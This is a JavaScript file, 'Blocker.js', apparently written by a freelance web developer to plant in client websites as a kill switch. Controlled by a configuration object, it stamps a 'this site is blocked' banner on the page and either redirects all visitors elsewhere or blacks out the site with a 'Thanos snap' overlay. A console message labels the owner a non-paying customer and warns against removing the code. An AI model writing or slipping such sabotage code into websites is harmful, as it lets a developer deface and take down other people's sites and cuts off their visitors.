/*!
 * Blocker.js
 * Made to protect against scammers
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 * Данный скрипт отвечает за наказание.
 */

// Создаем элементы
const a = document.createElement('a');
const d3usn0taminfo = document.createElement('div');
const text = document.createElement('div');
const circle = document.createElement('div');
const span = document.createElement('span');
const img = document.createElement('img');
const p = document.createElement('p');

// Устанавливаем атрибуты и стили
a.href = 'https://deusnotam.github.io';

d3usn0taminfo.style.position = 'absolute';
d3usn0taminfo.style.top = '0';
d3usn0taminfo.style.left = '50%';
d3usn0taminfo.style.transform = 'translateX(-50%)';
d3usn0taminfo.style.display = 'flex';
d3usn0taminfo.style.zIndex = '9999999999';

img.src = 'https://deusnotam.github.io/site/img/logo.jpeg';
img.style.width = '50px';
img.style.height = '50px';
img.style.position = 'absolute';
img.style.transform = 'translateX(-50%)';
img.style.zIndex = '2';
img.style.borderRadius = '10px';

circle.style.backgroundColor = '#040404';
circle.style.width = '400px';
circle.style.height = '400px';
circle.style.position = 'absolute';
circle.style.transform = 'translateX(-50%)';
circle.style.top = '-225px';
circle.style.borderRadius = '50%';
circle.style.zIndex = '1';
circle.style.border = '1px solid white';

span.style.color = 'white';
span.style.zIndex = '2';
span.style.position = 'absolute';
span.style.transform = 'translateX(-50%)';
span.style.width = '350px';
span.style.textAlign = 'center';
span.style.fontFamily = 'Comfortaa, cursive';
span.style.top = '50px';
span.innerHTML = 'Данный сайт заблокирован системой<br><p>D3usN0tam</p>Подробности на сайте';

text.style.position = 'absolute';
text.style.top = '-100px';
text.style.transition = 'top 0.3s ease';

a.addEventListener('mouseover', () => {
    text.style.top = '0';
});

a.addEventListener('mouseout', () => {
    text.style.top = '-100px';
});

p.style.animation = 'D3usN0tamColorTransition 5s infinite alternate';

document.head.insertAdjacentHTML('beforeend', `
    <style>
        @keyframes D3usN0tamColorTransition {
            0% {
                color: red;
            }
            25% {
                color: blue;
            }
            50% {
                color: green;
            }
            75% {
                color: orange;
            }
            100% {
                color: red;
            }
        }
    </style>
`);

// Добавляем элементы в DOM
document.body.appendChild(a);
a.appendChild(d3usn0taminfo);
d3usn0taminfo.appendChild(text);
text.appendChild(circle);
text.appendChild(span);
d3usn0taminfo.appendChild(img);


// Массив с эффектами
const effects = {
  //redirect - редирект на redirecturl
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  //thanos - поверх сайта чёрный экран с gif щелком таноса
  thanos: (startDate) => {
    console.log("Применяется эффект Thanos");
    const blackScreen = document.createElement("div");
  blackScreen.style.position = "fixed";
  blackScreen.style.top = "0";
  blackScreen.style.left = "0";
  blackScreen.style.width = "100%";
  blackScreen.style.height = "100%";
  blackScreen.style.background = "black";
  blackScreen.style.zIndex = "999999999";
  blackScreen.style.display = "flex";
  blackScreen.style.flexDirection = "column";
  blackScreen.style.alignItems = "center";
  blackScreen.style.justifyContent = "center";

  const gifImage = document.createElement("img");
  gifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
  gifImage.alt = "Tanos Snap";
  gifImage.style.marginBottom = "20px";

  const caption = document.createElement("p");
  caption.style.color = "white";
  caption.innerText = "Упс... Произошёл щелчок Таноса - сайт исчез...";

  blackScreen.appendChild(gifImage);
  blackScreen.appendChild(caption);

  document.body.appendChild(blackScreen);
  }
};
    
  // Функция для проверки домена
  function checkDomain() {

    // Применение эффекта, если домен найден в списке
    const effectFunction = effects[DeusSiteInfo.blocker_effect];
    if (effectFunction) {
        effectFunction(DeusSiteInfo.blocker_redirecturl || DeusSiteInfo.blocker_date);
    }
        
    // Проверка, если case у домена равен "didnt pay"
    if (DeusSiteInfo && DeusSiteInfo.blocker_cause === "didnt pay") {
        console.log(`Этот заказчик ${DeusSiteInfo.blocker_date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam\n\nThis customer ${DeusSiteInfo.blocker_date} did not pay for the work ordered, so be careful not to remove this code. For all questions, write here \nTelegram Group → https://t.me/d3usn0tam`);
      }
  }

// Вызов функции для проверки домена
checkDomain();
